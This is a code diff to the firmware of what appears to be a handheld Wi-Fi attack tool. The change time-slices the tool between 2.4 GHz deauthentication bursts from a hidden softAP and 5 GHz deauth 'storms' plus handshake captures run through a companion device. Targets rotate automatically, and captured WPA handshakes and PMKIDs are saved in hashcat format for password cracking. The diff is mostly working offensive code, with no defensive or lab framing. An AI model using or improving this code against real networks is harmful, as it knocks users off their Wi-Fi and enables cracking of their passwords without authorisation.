@@ -39,6 +39,7 @@ static volatile uint32_t s_pmk   = 0;
 static volatile uint32_t s_hs    = 0;
 static volatile uint32_t s_eapol = 0;
 static volatile uint32_t s_deauth_frames = 0;   /* total deauth/disassoc TX sent this session */
+static volatile bool     s_phase_5g = false;    /* false = 2.4 GHz active, true = 5 GHz via C5 */
 static volatile uint32_t s_last_catch = 0;
 static volatile uint32_t s_born = 0;
 static volatile uint8_t  s_ch    = 1;
@@ -425,21 +426,21 @@ static void hop_task(void *)
     uint16_t seq = (uint16_t)(esp_random() & 0x0FFF);
     uint32_t last_hunt = 0;
     uint32_t last_save = millis();
-
-    /* Session-scoped softAP. Per-hop silent_ap_begin/end cycles starved
-     * the WiFi TX buffer pool after a few minutes — softAP start would
-     * fail, every 80211_tx would return rc=257 (ESP_ERR_NO_MEM), and
-     * the UI task would stall waiting on the deadlocked WiFi task.
-     * Open once here, hop channels via esp_wifi_set_channel below,
-     * close once at task exit. Same pattern NUKE-ALL uses. */
-    bool ap_up = (wifi_silent_ap_begin(1) == ESP_OK);
-    if (!ap_up) {
-        Serial.println("[triton] initial softAP begin failed — continuing without TX");
-    }
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_promiscuous_rx_cb(cb);
+    /* Time-slice between 2.4 GHz local attacks and 5 GHz via C5.
+     * Concurrent TX (softAP deauth bursts + ESP-NOW C5 commands)
+     * exhausts the WiFi TX buffer pool and every 80211_tx returns
+     * rc=257. Instead: 10 s of pure 2.4 work, 10 s of pure 5 GHz
+     * C5 work. Promiscuous RX stays on either way so we still
+     * capture EAPOL from dual-band clients cascading down to 2.4. */
+    uint32_t phase_start = millis();
+    s_phase_5g = false;
 
     while (s_alive) {
+        uint32_t ph_now = millis();
+        if (ph_now - phase_start > 10000) {
+            phase_start = ph_now;
+            s_phase_5g = !s_phase_5g;
+        }
         /* Channel selection per mode. */
         switch (s_mode) {
         case TM_SURGICAL:
@@ -469,11 +470,13 @@ static void hop_task(void *)
         case TM_STEALTH:  hunt_period = 0;    break;
         }
 
-        if (ap_up && hunt_period > 0 && millis() - last_hunt > hunt_period) {
+        if (!s_phase_5g && hunt_period > 0 && millis() - last_hunt > hunt_period) {
             last_hunt = millis();
-            /* SoftAP stays up for the whole session. We just fire the
-             * bursts on whatever channel s_ch is pointing to (already
-             * set by esp_wifi_set_channel above). */
+            /* 2.4 GHz attack window only. SoftAP per deauth phase
+             * (original proven pattern). During the 5 GHz window we
+             * skip this entirely so TX buffers aren't contested with
+             * the C5 commands firing below. */
+            if (wifi_silent_ap_begin(s_ch) != ESP_OK) goto skip_burst;
             if (s_mode == TM_SURGICAL) {
                 int bursts = 8;
                 for (int k = 0; k < bursts && s_alive; ++k) {
@@ -499,6 +502,13 @@ static void hop_task(void *)
                     }
                 }
             }
+            wifi_silent_ap_end();
+            /* silent_ap_end() disables promisc. Re-arm so the dwell
+             * window catches beacons/EAPOL/PMKID. */
+            esp_wifi_set_promiscuous(true);
+            esp_wifi_set_promiscuous_rx_cb(cb);
+            esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
+            skip_burst: ;
         }
 
         /* Drain any PMKID/handshake captures that the Wi-Fi callback
@@ -527,7 +537,6 @@ static void hop_task(void *)
     }
     capture_flush();       /* flush any trailing captures before exit */
     triton_learn_save();
-    if (ap_up) wifi_silent_ap_end();
     vTaskDelete(nullptr);
 }
 
@@ -975,13 +984,11 @@ void feat_triton(void)
             ui_draw_status("wifi", "triton");
         }
 
-        /* Every 6s, rotate to the next 5 GHz target. Fire a C5
-         * handshake capture (promisc-listens for M1/M2) then a 4s
-         * deauth burst that forces clients to re-associate right into
-         * our capture window. Dual-band clients cascade back to 2.4
-         * where local Triton also catches the M1/M2 — so we snag the
-         * handshake on whichever band the client picks. */
-        if (c5_online && now - last_c5_deauth > 6000) {
+        /* 5 GHz attack window: fire C5 commands. Only runs during
+         * phase_5g so we're not competing with softAP deauth TX for
+         * buffers. Rotate every 6 s inside the 10 s window → ~1 target
+         * hit per 5G phase, every ~20 s cycle. */
+        if (s_phase_5g && c5_online && now - last_c5_deauth > 6000) {
             last_c5_deauth = now;
             c5_ap_t aps[64];
             int n = c5_aps(aps, 64);
@@ -990,20 +997,19 @@ void feat_triton(void)
             if (five_n > 0) {
                 const c5_ap_t &t = aps[c5_target_idx % five_n];
                 /* HS capture first so the C5 is already listening when
-                 * the deauth fires. Give it 5s: 1s settle + 4s under
-                 * deauth pressure. */
+                 * the deauth storm forces the re-auth. */
                 c5_cmd_hs(t.bssid, t.channel, 5000);
                 c5_cmd_deauth(t.bssid, t.channel, 0, 4000);
                 c5_target_idx++;
             } else {
-                /* Re-scan if our 5G list emptied out. */
                 c5_clear_results();
                 c5_cmd_scan_5g(400);
             }
         }
 
-        /* Drain any RESP_HS tuples the C5 streamed back into the
-         * hashcat 22000 file + wardrive CSV if GPS has a fix. */
+        /* Drain RESP_HS tuples from the C5 into the hashcat log. This
+         * runs every loop regardless of phase — if the C5 captured a
+         * handshake during its window we want to flush it ASAP. */
         if (c5_online) {
             c5_hs_t hs[4];
             int nh = c5_hss(hs, 4);
